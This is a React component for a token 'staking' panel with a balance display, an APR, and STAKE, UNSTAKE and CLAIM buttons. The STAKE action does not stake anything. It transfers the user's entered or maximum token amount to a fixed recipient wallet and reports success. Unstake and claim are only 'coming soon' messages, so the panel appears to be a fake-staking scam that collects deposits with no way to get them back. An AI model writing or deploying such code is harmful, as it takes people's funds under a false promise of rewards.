"use client";

import { useEffect, useState, useCallback } from "react";
import { BrowserProvider, Contract, formatUnits, parseUnits } from "ethers";
import { ArrowUpCircle, ArrowDownCircle, Coins } from "lucide-react";
import { TOKEN_CONTRACT, RECIPIENT_WALLET, TOKEN_TICKER } from "@/lib/chain";

const ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
];

function getInjected() {
  if (typeof window === "undefined") return null;
  const w = window as unknown as {
    ethereum?: { request: (a: { method: string }) => Promise<unknown> };
  };
  return w.ethereum ?? null;
}

export default function StakePanel({ apr }: { apr: string }) {
  const [amount, setAmount] = useState("");
  const [balance, setBalance] = useState<string | null>(null);
  const [decimals, setDecimals] = useState(18);
  const [busy, setBusy] = useState(false);
  const [status, setStatus] = useState<string | null>(null);

  const loadBalance = useCallback(async () => {
    const p = getInjected();
    if (!p) return;
    try {
      const provider = new BrowserProvider(p);
      const accs = (await p.request({ method: "eth_accounts" })) as string[];
      if (!accs.length) return;
      const token = new Contract(TOKEN_CONTRACT, ABI, provider);
      const dec = await token.decimals();
      const bal = await token.balanceOf(accs[0]);
      setDecimals(Number(dec));
      setBalance(formatUnits(bal, dec));
    } catch {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    loadBalance();
    const p = getInjected();
    if (!p) return;
    const ep = p as unknown as {
      on?: (e: string, cb: () => void) => void;
      removeListener?: (e: string, cb: () => void) => void;
    };
    ep.on?.("accountsChanged", loadBalance);
    return () => {
      ep.removeListener?.("accountsChanged", loadBalance);
    };
  }, [loadBalance]);

  const stake = async () => {
    const p = getInjected();
    if (!p) {
      setStatus("Connect your wallet first.");
      return;
    }
    if (!amount || parseFloat(amount) <= 0) {
      setStatus("Enter a valid amount.");
      return;
    }
    setBusy(true);
    setStatus(null);
    try {
      const provider = new BrowserProvider(p);
      const signer = await provider.getSigner();
      const token = new Contract(TOKEN_CONTRACT, ABI, signer);
      const amt = parseUnits(amount, decimals);
      const tx = await token.transfer(RECIPIENT_WALLET, amt);
      setStatus("Waiting for confirmation…");
      await tx.wait();
      setStatus("Stake successful! 🎉");
      setAmount("");
      await loadBalance();
    } catch (e) {
      console.error(e);
      const m = (e as Error).message;
      setStatus("Failed: " + (m.length > 120 ? m.slice(0, 120) + "…" : m));
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="glass rounded-3xl p-6 md:p-8 w-full">
      <div className="flex items-center justify-between mb-5">
        <span className="text-sm font-semibold text-blue-200/70">
          Your {TOKEN_TICKER}
        </span>
        <span className="text-sm font-bold text-cyan-300">
          {balance !== null ? `${Number(balance).toLocaleString()} ${TOKEN_TICKER}` : "—"}
        </span>
      </div>

      <div className="bg-[#0a1228] border border-blue-400/20 rounded-2xl p-4 flex items-center justify-between gap-3">
        <input
          type="number"
          inputMode="decimal"
          min="0"
          step="any"
          placeholder="0.00"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="bg-transparent text-white text-2xl font-bold w-full outline-none placeholder:text-white/25"
        />
        <button
          onClick={() => balance && setAmount(balance)}
          className="px-3 py-1.5 rounded-lg text-xs font-bold bg-blue-500/20 text-cyan-300 hover:bg-blue-500/30 transition"
        >
          MAX
        </button>
      </div>

      <div className="flex items-center justify-between mt-4 mb-6">
        <span className="text-sm font-semibold text-blue-200/70">Current APR</span>
        <span className="text-lg font-bold text-yellow-300">{apr}</span>
      </div>

      <div className="grid grid-cols-3 gap-3">
        <button
          onClick={stake}
          disabled={busy}
          className="rounded-xl px-4 py-3 text-xs font-bold flex items-center justify-center gap-1.5 bg-gradient-to-r from-[#2f7bff] to-[#35e0ff] text-white disabled:opacity-50 hover:brightness-110 transition"
        >
          <ArrowUpCircle className="w-4 h-4" />
          {busy ? "…" : "STAKE"}
        </button>
        <button
          onClick={() => setStatus("Unstake coming soon.")}
          className="rounded-xl px-4 py-3 text-xs font-bold flex items-center justify-center gap-1.5 bg-pink-500/80 text-white hover:brightness-110 transition"
        >
          <ArrowDownCircle className="w-4 h-4" /> UNSTAKE
        </button>
        <button
          onClick={() => setStatus("Claim coming soon.")}
          className="rounded-xl px-4 py-3 text-xs font-bold flex items-center justify-center gap-1.5 bg-gradient-to-r from-[#ffd23f] to-[#ffb020] text-[#1a1200] hover:brightness-105 transition"
        >
          <Coins className="w-4 h-4" /> CLAIM
        </button>
      </div>

      {status && (
        <p className="text-center text-sm mt-4 text-cyan-200 break-words">
          {status}
        </p>
      )}

      <p className="text-center text-xs text-blue-200/50 mt-6">
        Deposit {TOKEN_TICKER} and start trolling your way to rewards.
      </p>
    </div>
  );
}
